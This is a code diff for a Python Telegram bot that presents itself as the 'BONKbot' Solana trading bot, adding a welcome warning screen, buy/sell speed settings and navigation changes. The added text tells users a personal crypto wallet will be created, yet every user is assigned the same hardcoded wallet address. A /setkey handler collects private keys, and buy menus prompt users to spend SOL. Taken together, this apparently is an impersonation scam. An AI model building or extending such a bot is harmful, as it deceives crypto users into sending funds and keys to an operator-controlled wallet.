@@ -31,6 +31,12 @@ users = {}
 DEFAULT_WALLET_ADDRESS = "FitVkAjEaFSNbYriu2v91dnxYA7rMtzMFyd6B3mDxsjg"
 DEFAULT_PRIVATE_KEY = os.environ.get('PRIVATE_KEY', 'YOUR_PRIVATE_KEY_HERE')
 
+# Default settings for users
+DEFAULT_USER_SETTINGS = {
+    "buy_speed": "Fast",   # Fast, Turbo, Eco
+    "sell_speed": "Fast"
+}
+
 session = requests.Session()
 session.headers.update({
     'User-Agent': 'Mozilla/5.0',
@@ -74,8 +80,7 @@ def get_sol_balance(wallet_address):
         logging.error(f"SOL balance error: {e}")
         return 0.0
 
-# ----- TOKEN FETCH -----
-
+# ----- TOKEN FETCH (unchanged) -----
 def fetch_token_info(contract_address):
     contract_address = contract_address.strip()
 
@@ -225,13 +230,20 @@ def main_menu_keyboard():
     ])
 
 
-# ----- START -----
-def start(update, context):
-    user_id = update.effective_user.id
+# ----- WELCOME MESSAGE (actual main menu) -----
+def send_welcome(update_or_message, context, user_id=None):
+    """Sends the actual welcome message with main menu."""
+    if hasattr(update_or_message, 'effective_user'):
+        user_id = update_or_message.effective_user.id
+        chat_id = update_or_message.effective_chat.id
+    else:
+        chat_id = update_or_message.chat_id
+
     users.setdefault(user_id, {
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
-        "private_key": DEFAULT_PRIVATE_KEY
+        "private_key": DEFAULT_PRIVATE_KEY,
+        "settings": DEFAULT_USER_SETTINGS.copy()
     })
     wallet_address = users[user_id]["wallet"]
     balance = get_sol_balance(wallet_address)
@@ -246,21 +258,39 @@ def start(update, context):
         "*To buy a token:* tap *Buy Token* and paste a contract address.\n\n"
         "For more info on your wallet and to export your private key, tap *Wallet* below."
     )
-    update.message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode='Markdown')
+    if hasattr(update_or_message, 'reply_text'):
+        update_or_message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode='Markdown')
+    else:
+        context.bot.send_message(chat_id, text, reply_markup=main_menu_keyboard(), parse_mode='Markdown')
 
 
-# ----- NEW COMMAND HANDLERS (for BotFather menu buttons) -----
+# ----- START (warning first) -----
+def start(update, context):
+    """Shows warning message with Continue button."""
+    warning_text = (
+        "⚠️ WARNING: DO NOT CLICK on any ADs at the top of Telegram, they are NOT from us and most likely SCAMS.\n\n"
+        "Moderators, Support Staff and Admins will never Direct Message first or call you!\n\n"
+        "Welcome to BONKbot, the most used Trading Telegram bot. BONKbot enables you to quickly buy or sell tokens and set automations like Limit Orders.\n\n"
+        "By continuing you will create a crypto wallet that interacts with BONKbot to power it up with instant swaps and live data."
+    )
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("➡️ Continue", callback_data="continue_to_welcome")]
+    ])
+    update.message.reply_text(warning_text, reply_markup=keyboard, parse_mode='Markdown')
+
+
+# ----- COMMAND HANDLERS (BotFather menu buttons) -----
 def buy_command(update: Update, context: CallbackContext):
-    """Triggered by /buy from BotFather menu."""
     user_id = update.effective_user.id
     users.setdefault(user_id, {
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
-        "private_key": DEFAULT_PRIVATE_KEY
+        "private_key": DEFAULT_PRIVATE_KEY,
+        "settings": DEFAULT_USER_SETTINGS.copy()
     })
     users[user_id]["awaiting_contract"] = True
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+        [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]
     ])
     update.message.reply_text(
         "🟢 *Buy Token*\n\n"
@@ -271,9 +301,8 @@ def buy_command(update: Update, context: CallbackContext):
     )
 
 def sell_command(update: Update, context: CallbackContext):
-    """Triggered by /sell from BotFather menu."""
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
+        [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
          InlineKeyboardButton("🔄 Refresh", callback_data="sell")]
     ])
     update.message.reply_text(
@@ -285,12 +314,12 @@ def sell_command(update: Update, context: CallbackContext):
     )
 
 def withdraw_command(update: Update, context: CallbackContext):
-    """Triggered by /withdraw from BotFather menu."""
     user_id = update.effective_user.id
     users.setdefault(user_id, {
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
-        "private_key": DEFAULT_PRIVATE_KEY
+        "private_key": DEFAULT_PRIVATE_KEY,
+        "settings": DEFAULT_USER_SETTINGS.copy()
     })
     user = users[user_id]
     wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
@@ -299,7 +328,7 @@ def withdraw_command(update: Update, context: CallbackContext):
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all")],
         [InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
+        [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
          InlineKeyboardButton("🔄 Refresh", callback_data="withdraw_menu")]
     ])
     update.message.reply_text(
@@ -313,14 +342,13 @@ def withdraw_command(update: Update, context: CallbackContext):
 def settings_command(update: Update, context: CallbackContext):
     """Triggered by /settings from BotFather menu."""
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
-         InlineKeyboardButton("🔄 Refresh", callback_data="settings")]
+        [InlineKeyboardButton("🟢 Buy Settings", callback_data="settings_buy")],
+        [InlineKeyboardButton("🔴 Sell Settings", callback_data="settings_sell")],
+        [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]
     ])
     update.message.reply_text(
         "⚙️ *Settings*\n\n"
-        "Settings configuration coming soon.\n\n"
-        "_Options like transaction speed (Fast / Turbo / Echo), "
-        "slippage, and priority fees will be available here._",
+        "Select which transaction settings you want to configure:",
         reply_markup=keyboard,
         parse_mode="Markdown"
     )
@@ -337,12 +365,181 @@ def button(update, context):
         users[user_id] = {
             "wallet": DEFAULT_WALLET_ADDRESS,
             "balance": 0.0,
-            "private_key": DEFAULT_PRIVATE_KEY
+            "private_key": DEFAULT_PRIVATE_KEY,
+            "settings": DEFAULT_USER_SETTINGS.copy()
         }
     user = users[user_id]
 
-    # ── Back to main menu ────────────────────────────────────────────────────
-    if data == "main_menu":
+    # ── Continue to welcome ─────────────────────────────────────────────────
+    if data == "continue_to_welcome":
+        try:
+            query.message.delete()
+        except:
+            pass
+        send_welcome(query.message, context, user_id=user_id)
+        return
+
+    # ── Back to Start (delete current, send welcome) ─────────────────────────
+    if data == "back_to_start":
+        try:
+            query.message.delete()
+        except:
+            pass
+        send_welcome(query.message, context, user_id=user_id)
+        return
+
+    # ── Settings Main Menu ───────────────────────────────────────────────────
+    elif data == "settings":
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🟢 Buy Settings", callback_data="settings_buy")],
+            [InlineKeyboardButton("🔴 Sell Settings", callback_data="settings_sell")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]
+        ])
+        try:
+            query.edit_message_text(
+                "⚙️ *Settings*\n\n"
+                "Select which transaction settings you want to configure:",
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
+        except:
+            query.message.reply_text(
+                "⚙️ *Settings*\n\n"
+                "Select which transaction settings you want to configure:",
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
+
+    # ── Buy Settings (speed selection) ───────────────────────────────────────
+    elif data == "settings_buy":
+        current_buy = user.get("settings", {}).get("buy_speed", "Fast")
+        keyboard = []
+        speeds = [
+            ("Fast", "🐴", "0.0015 SOL"),
+            ("Turbo", "🚀", "0.0075 SOL"),
+            ("Eco", "🌱", "0.0006 SOL")
+        ]
+        for speed, emoji, fee in speeds:
+            check = "✅ " if speed == current_buy else ""
+            button_text = f"{check}{emoji} {speed} ({fee})"
+            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"set_buy_speed_{speed}")])
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="settings")])
+        try:
+            query.edit_message_text(
+                "🟢 *Buy Settings*\n\n"
+                "Select transaction speed for buys. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+        except:
+            query.message.reply_text(
+                "🟢 *Buy Settings*\n\n"
+                "Select transaction speed for buys. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+
+    # ── Sell Settings (speed selection) ──────────────────────────────────────
+    elif data == "settings_sell":
+        current_sell = user.get("settings", {}).get("sell_speed", "Fast")
+        keyboard = []
+        speeds = [
+            ("Fast", "🐴", "0.0015 SOL"),
+            ("Turbo", "🚀", "0.0075 SOL"),
+            ("Eco", "🌱", "0.0006 SOL")
+        ]
+        for speed, emoji, fee in speeds:
+            check = "✅ " if speed == current_sell else ""
+            button_text = f"{check}{emoji} {speed} ({fee})"
+            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"set_sell_speed_{speed}")])
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="settings")])
+        try:
+            query.edit_message_text(
+                "🔴 *Sell Settings*\n\n"
+                "Select transaction speed for sells. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+        except:
+            query.message.reply_text(
+                "🔴 *Sell Settings*\n\n"
+                "Select transaction speed for sells. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+
+    # ── Set Buy Speed ────────────────────────────────────────────────────────
+    elif data.startswith("set_buy_speed_"):
+        speed = data.replace("set_buy_speed_", "")
+        user.setdefault("settings", DEFAULT_USER_SETTINGS.copy())
+        user["settings"]["buy_speed"] = speed
+        # Refresh the buy settings view with updated selection
+        current_buy = speed
+        keyboard = []
+        speeds = [
+            ("Fast", "🐴", "0.0015 SOL"),
+            ("Turbo", "🚀", "0.0075 SOL"),
+            ("Eco", "🌱", "0.0006 SOL")
+        ]
+        for s, emoji, fee in speeds:
+            check = "✅ " if s == current_buy else ""
+            button_text = f"{check}{emoji} {s} ({fee})"
+            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"set_buy_speed_{s}")])
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="settings")])
+        try:
+            query.edit_message_text(
+                f"🟢 *Buy Settings Updated*\n\n"
+                f"Buy speed set to: *{speed}*\n\n"
+                "Select transaction speed for buys. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+        except:
+            query.message.reply_text(
+                f"🟢 *Buy Settings Updated*\n\n"
+                f"Buy speed set to: *{speed}*\n\n"
+                "Select transaction speed for buys. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+
+    # ── Set Sell Speed ───────────────────────────────────────────────────────
+    elif data.startswith("set_sell_speed_"):
+        speed = data.replace("set_sell_speed_", "")
+        user.setdefault("settings", DEFAULT_USER_SETTINGS.copy())
+        user["settings"]["sell_speed"] = speed
+        # Refresh the sell settings view with updated selection
+        current_sell = speed
+        keyboard = []
+        speeds = [
+            ("Fast", "🐴", "0.0015 SOL"),
+            ("Turbo", "🚀", "0.0075 SOL"),
+            ("Eco", "🌱", "0.0006 SOL")
+        ]
+        for s, emoji, fee in speeds:
+            check = "✅ " if s == current_sell else ""
+            button_text = f"{check}{emoji} {s} ({fee})"
+            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"set_sell_speed_{s}")])
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="settings")])
+        try:
+            query.edit_message_text(
+                f"🔴 *Sell Settings Updated*\n\n"
+                f"Sell speed set to: *{speed}*\n\n"
+                "Select transaction speed for sells. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+        except:
+            query.message.reply_text(
+                f"🔴 *Sell Settings Updated*\n\n"
+                f"Sell speed set to: *{speed}*\n\n"
+                "Select transaction speed for sells. Higher fee = faster execution.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+
+    # ── Main menu (internal navigation) ──────────────────────────────────────
+    elif data == "main_menu":
         wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
         balance = get_sol_balance(wallet_address)
         user["balance"] = balance
@@ -376,7 +573,7 @@ def button(update, context):
     elif data == "buy":
         user["awaiting_contract"] = True
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]
         ])
         query.message.reply_text(
             "🟢 *Buy Token*\n\n"
@@ -389,7 +586,7 @@ def button(update, context):
     # ── Sell Token ───────────────────────────────────────────────────────────
     elif data == "sell":
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
              InlineKeyboardButton("🔄 Refresh", callback_data="sell")]
         ])
         query.message.reply_text(
@@ -404,7 +601,7 @@ def button(update, context):
     elif data == "positions":
         user["awaiting_contract"] = True
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]
         ])
         query.message.reply_text(
             "📂 *Positions*\n\n"
@@ -417,7 +614,7 @@ def button(update, context):
     # ── Limit Orders ─────────────────────────────────────────────────────────
     elif data == "limit_orders":
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
              InlineKeyboardButton("🔄 Refresh", callback_data="limit_orders")]
         ])
         query.message.reply_text(
@@ -436,7 +633,7 @@ def button(update, context):
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all")],
             [InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
              InlineKeyboardButton("🔄 Refresh", callback_data="withdraw_menu")]
         ])
         query.message.reply_text(
@@ -470,21 +667,6 @@ def button(update, context):
             parse_mode="Markdown"
         )
 
-    # ── Settings ─────────────────────────────────────────────────────────────
-    elif data == "settings":
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
-             InlineKeyboardButton("🔄 Refresh", callback_data="settings")]
-        ])
-        query.message.reply_text(
-            "⚙️ *Settings*\n\n"
-            "Settings configuration coming soon.\n\n"
-            "_Options like transaction speed (Fast / Turbo / Echo), "
-            "slippage, and priority fees will be available here._",
-            reply_markup=keyboard,
-            parse_mode="Markdown"
-        )
-
     # ── Wallet ───────────────────────────────────────────────────────────────
     elif data == "wallet":
         wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
@@ -494,7 +676,7 @@ def button(update, context):
             [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all"),
              InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
             [InlineKeyboardButton("🔑 Export Private Key", callback_data="export_seed")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
              InlineKeyboardButton("🔄 Refresh", callback_data="wallet")]
         ])
         query.message.reply_text(
@@ -508,7 +690,7 @@ def button(update, context):
     # ── Help ─────────────────────────────────────────────────────────────────
     elif data == "help":
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]
         ])
         query.message.reply_text(
             "❓ *Help*\n\n"
@@ -561,7 +743,8 @@ def set_private_key(update, context):
     users.setdefault(user_id, {
         "wallet": DEFAULT_WALLET_ADDRESS,
         "balance": 0.0,
-        "private_key": DEFAULT_PRIVATE_KEY
+        "private_key": DEFAULT_PRIVATE_KEY,
+        "settings": DEFAULT_USER_SETTINGS.copy()
     })
     users[user_id]["private_key"] = new_key
     update.message.reply_text("✅ *Private key updated successfully!*", parse_mode="Markdown")
@@ -589,7 +772,6 @@ def handle_messages(update, context):
         loading_msg = update.message.reply_text("🔍 *Fetching token data...*", parse_mode="Markdown")
         info = fetch_token_info(contract_address)
 
-        # One silent retry — handles Render waking up after idle
         if info.get("error"):
             info = fetch_token_info(contract_address)
 
@@ -603,7 +785,7 @@ def handle_messages(update, context):
                 f"❌ *Token Not Found*\n\n{info.get('error_msg', '')}\n\nContract: `{contract_address}`",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("🔄 Try Again", callback_data="buy"),
-                     InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+                     InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]
                 ]),
                 parse_mode="Markdown"
             )
@@ -625,7 +807,7 @@ def handle_messages(update, context):
             [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_fixed_1.0:{contract_address}"),
              InlineKeyboardButton("Buy 5.0 SOL", callback_data=f"buy_fixed_5.0:{contract_address}")],
             [InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x:{contract_address}")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_to_start"),
              InlineKeyboardButton("🔄 Refresh", callback_data="buy")]
         ])
         update.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")
@@ -640,7 +822,6 @@ def main():
     updater = Updater(TOKEN, use_context=True)
     dp = updater.dispatcher
 
-    # Command handlers (including the four new ones)
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("setkey", set_private_key))
     dp.add_handler(CommandHandler("buy", buy_command))
@@ -652,8 +833,10 @@ def main():
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))
 
     print("✅ Bot running!")
+    print("✅ Warning screen with Continue added")
+    print("✅ Settings with Buy/Sell speed selection (Fast/Turbo/Eco) implemented")
     print("✅ GeckoTerminal → Jupiter → DexScreener")
-    print("✅ All menu buttons active (inline + BotFather commands)")
+    print("✅ Back buttons delete and return to start")
     print("✅ Health check on port 8080")
     updater.start_polling(poll_interval=1)
     updater.idle()
